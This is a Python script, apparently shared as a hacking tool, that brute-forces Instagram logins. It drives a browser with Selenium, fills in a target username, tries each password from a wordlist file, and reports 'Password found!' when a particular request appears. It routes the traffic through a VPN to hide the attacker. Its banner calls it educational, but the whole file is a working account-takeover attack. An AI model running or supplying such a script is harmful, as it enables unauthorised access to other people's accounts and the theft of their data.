import time
import subprocess
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.keys import Keys
from pyvirtualdisplay import Display
from colorama import Fore, Back, Style

subprocess.run(['clear'])

XANA =  """                                                              
                                         ,--.                 
 ,--,     ,--,     ,---,               ,--.'|    ,---,        
 |'. \   / .`|    '  .' \          ,--,:  : |   '  .' \       
 ; \ `\ /' / ;   /  ;    '.     ,`--.'`|  ' :  /  ;    '.     
 `. \  /  / .'  :  :       \    |   :  :  | | :  :       \    
  \  \/  / ./   :  |   /\   \   :   |   \ | : :  |   /\   \   
   \  \.'  /    |  :  ' ;.   :  |   : '  '; | |  :  ' ;.   :  
    \  ;  ;     |  |  ;/  \   \ '   ' ;.    ; |  |  ;/  \   \ 
   / \  \  \    '  :  | \  \ ,' |   | | \   | '  :  | \  \ ,' 
  ;  /\  \  \   |  |  '  '--'   '   : |  ; .' |  |  '  '--'   
./__;  \  ;  \  |  :  :         |   | '`--'   |  :  :         
|   : / \  \  ; |  | ,'         '   : |       |  | ,'         
;   |/   \  ' | `--''           ;   |.'       `--''           
`---'     `--`                  '---'                         
                                                              """

print(Fore.RED+XANA)
print(Style.RESET_ALL)
print("\tInstagram Brute Force by Mario León")
print("\tMade for educational purposes only")
user = input(Fore.GREEN+"\tInstagram username or mail: "+Style.RESET_ALL)
                                              
subprocess.run(['sudo', 'windscribe', 'start'])
subprocess.run(['sudo', 'windscribe', 'connect'])

def monitor_status(driver):
    while True:
        requests = driver.execute_script(
            """
            let requests = [];
            performance.getEntries().forEach(entry => {
                if (entry.entryType === 'resource') {
                    requests.push({url: entry.name, status: entry.response ? entry.response.status : 'N/A'});
                }
            });
            return requests;
            """
        )

        if requests:
            for request in requests:
                if "https://www.instagram.com/ajax/bootloader-endpoint" in request['url']:
                    print("Password found!")
                    subprocess.run(['sudo', 'windscribe', 'disconnect'])
                    return  # Termina la ejecución del programa
        else:
            print("No se han realizado solicitudes aún.")

        time.sleep(1)  # Espera 1 segundo antes de verificar nuevamente

def login_and_actions(driver, file_path):
    # Encontrar y hacer clic en el botón "Allow all cookies"
    allow_cookies_button = WebDriverWait(driver, 10).until(
        EC.presence_of_element_located((By.XPATH, '//button[contains(text(), "Allow all cookies")]'))
    )
    allow_cookies_button.click()

    # Esperar un momento para que la página se cargue
    time.sleep(3)

    # Encontrar la caja de texto para el nombre de usuario y escribir "pngyasociados"
    username_input = driver.find_element(By.CSS_SELECTOR, 'input[name="username"]')
    username_input.send_keys(user)

    # Encontrar la caja de texto para la contraseña
    password_input = driver.find_element(By.CSS_SELECTOR, 'input[name="password"]')

    with open(file_path, "r") as file:
        lines = file.readlines()

        for line in lines:
            try:
                # Limpiar el contenido de la caja de texto password_input
                password_input.send_keys(Keys.CONTROL + "a")  # Seleccionar todo el texto
                password_input.send_keys(Keys.DELETE)  # Borrar el texto seleccionado

                # Introducir la nueva línea del archivo en la caja de texto password_input
                password_input.send_keys(line.strip())
                print(f"Trying password: {line.strip()}")
            except Exception as e:
                print(f"Password found!")
                return

            # Encontrar y hacer clic en el botón "Log in"
            login_button = driver.find_element(By.CSS_SELECTOR, 'button[type="submit"]')
            login_button.click()

            time.sleep(5)  # Esperar 5 segundos

            # Encontrar la respuesta HTTP
            requests = driver.execute_script(
                """
                let requests = [];
                performance.getEntries().forEach(entry => {
                    if (entry.entryType === 'resource') {
                        requests.push({url: entry.name, status: entry.response ? entry.response.status : 'N/A'});
                    }
                });
                return requests;
                """
            )

            found = False
            for request in requests:
                if "https://www.instagram.com/ajax/bootloader-endpoint" in request['url']:
                    print("Password found!")
                    subprocess.run(['sudo', 'windscribe', 'disconnect'])
                    return  # Termina la ejecución del programa
                else:
                    found = False

            if not found:
                print(f"{line.strip()} was not the correct password")

if __name__ == "__main__":

    display = Display(visible=0, size=(1920, 1080))  # Tamaño de la pantalla virtual (opcional)
    display.start()

    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")

    
    chrome_path = "/usr/bin/chromedriver"
    service = Service(chrome_path)
    chrome_options = Options()
    driver = webdriver.Chrome(service=service, options=chrome_options)

    url_to_monitor = 'https://www.instagram.com/'
    file_path = 'passwords.txt'

    driver.get(url_to_monitor)

    login_and_actions(driver, file_path)
    monitor_status(driver)
